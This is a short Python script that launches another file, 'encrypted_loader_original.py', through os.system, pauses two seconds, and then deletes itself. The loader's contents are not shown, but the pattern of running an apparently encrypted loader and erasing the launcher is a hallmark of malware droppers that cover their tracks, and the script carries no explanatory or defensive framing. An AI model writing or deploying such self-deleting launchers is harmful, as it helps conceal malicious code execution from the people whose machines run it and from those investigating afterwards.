
#!/usr/bin/env python3
import os
import time

def run_and_delete():
    os.system("python3 encrypted_loader_original.py")
    time.sleep(2)
    os.remove(__file__)

if __name__ == "__main__":
    run_and_delete()
